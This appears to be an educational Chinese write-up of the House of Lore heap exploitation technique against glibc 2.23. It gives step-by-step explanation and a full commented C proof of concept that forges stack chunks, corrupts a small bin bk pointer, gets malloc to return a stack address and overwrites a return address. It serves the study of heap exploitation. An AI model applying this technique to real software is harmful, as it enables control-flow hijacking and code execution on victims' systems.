# 漏洞利用文档：House of Lore攻击

## 攻击对象
- **目标内存位置**: small bin中的victim chunk的bk指针。具体地址为chunk头地址（例如调试中的`0x603000`）的bk字段（偏移+8字节）。
- **攻击结构**: small bin的双向链表结构。攻击通过修改victim chunk的bk指针，指向栈上的伪造chunk，从而劫持small bin链表。

## 利用过程
1. **初始分配**: 分配一个small chunk（victim），大小0x100字节。
2. **栈上伪造chunk**: 在栈上构造两个伪造的chunk（stack_buffer_1和stack_buffer_2），设置它们的fwd和bk指针以形成双向链表，并指向victim chunk，以绕过Glibc的small bin完整性检查。
3. **防止合并**: 分配一个大chunk（p5），防止victim chunk在free时与top chunk合并。
4. **释放到unsorted bin**: 释放victim chunk，它进入unsorted bin。
5. **移动到small bin**: 分配一个无法由unsorted bin处理的大chunk（p2），迫使victim chunk被移动到small bin。
6. **漏洞利用**: 覆盖victim chunk的bk指针，使其指向栈上的伪造chunk（stack_buffer_1）。
7. **劫持链表**: 执行malloc(0x100)从small bin中取出victim chunk，同时更新bin->bk为被注入的栈地址。
8. **栈上分配**: 再次malloc(0x100)时，从被劫持的small bin链表中分配栈上的伪造chunk，返回栈地址。
9. **控制流劫持**: 使用memcpy覆盖栈上的返回地址，跳转到目标函数（jackpot）。

## 利用条件
- **漏洞类型**: 堆溢出写或Use-After-Free（UAF），允许修改已free chunk的bk指针。在本PoC中，模拟了直接覆盖victim->bk的漏洞（`victim[1] = (intptr_t)stack_buffer_1`）。
- **内存状态**: victim chunk必须能被释放并移动到small bin中，且small bin链表可被修改。
- **地址信息**: 需要知道栈地址和堆地址，以构造伪造的chunk结构。

## 利用效果
- **任意地址分配**: 通过在栈上分配内存，获得对栈空间的写权限（p4指向栈地址`0x7fffffffe320`）。
- **控制流劫持**: 覆盖返回地址，执行任意代码（跳转到jackpot函数）。
- **绕过缓解机制**: 成功绕过Glibc的small bin链表完整性检查和栈保护（如Stack Canary），因为攻击直接操作内存而非触发检查。

## 涉及缓解机制
Glibc在malloc过程中对small bin链表进行完整性检查，相关源码片段（来自glibc-2.23/malloc/malloc.c）：
```c
else
{
  bck = victim->bk;
  if (__glibc_unlikely (bck->fd != victim)) // 检查双向链表是否损坏
  {
    errstr = "malloc(): smallbin double linked list corrupted";
    goto errout;
  }
  set_inuse_bit_at_offset (victim, nb);
  bin->bk = bck;
  bck->fd = bin;
  // ...
}
```
- **检查机制**: 在从small bin取出chunk时，验证victim->bk->fd是否等于victim，以防止链表损坏。
- **绕过方式**: 攻击通过精心构造栈上伪造chunk的fwd和bk指针，使`bck->fd == victim`成立，从而绕过检查。例如，设置`stack_buffer_1[2] = victim_chunk`和`stack_buffer_2[2] = stack_buffer_1`，确保链表看起来完整。

## Proof of Concept
以下是漏洞利用原型的源码，添加了关键中文注释：

```c
/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main(int argc, char * argv[]){
  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(0x100); // 分配victim chunk，大小0x100
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2; // 计算chunk头地址（减去0x10，因为64位系统chunk头为16字节）

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake chunk on the stack\n");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0; // 伪造chunk的prev_size
  stack_buffer_1[1] = 0; // 伪造chunk的size
  stack_buffer_1[2] = victim_chunk; // 设置fwd指针指向victim chunk头，用于绕过链表检查

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2; // 设置bk指针指向stack_buffer_2
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1; // 设置stack_buffer_2的fwd指针指向stack_buffer_1，形成双向链表
  
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000); // 分配大chunk，防止free时victim与top chunk合并
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);

  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim); // 释放victim到unsorted bin

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200); // 分配大chunk，迫使victim从unsorted bin移动到small bin
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------
  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
  victim[1] = (intptr_t)stack_buffer_1; // 漏洞点：覆盖victim->bk指向栈上的stack_buffer_1，模拟堆溢出或UAF
  //------------------------------------

  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");
  void *p3 = malloc(0x100); // 第一次malloc(0x100)，取出victim chunk，并更新bin->bk为stack_buffer_1

  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(0x100); // 第二次malloc(0x100)，从被劫持的链表中分配栈上的伪造chunk，返回栈地址
  fprintf(stderr, "p4 = malloc(0x100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // p4指向栈地址，证明任意地址分配成功
  intptr_t sc = (intptr_t)jackpot; // 目标函数地址
  long offset = (long)__builtin_frame_address(0) - (long)p4; // 计算偏移量
  memcpy((p4+offset+8), &sc, 8); // 覆盖返回地址，跳过canary，直接劫持控制流

  // sanity check
  assert((long)__builtin_return_address(0) == (long)jackpot); // 验证返回地址已被劫持
}
```

此PoC演示了如何利用House of Lore攻击绕过Glibc的防护机制，实现栈上分配和控制流劫持。关键步骤包括伪造chunk结构、修改bk指针和通过malloc操作劫持链表。注释突出了漏洞利用的核心逻辑。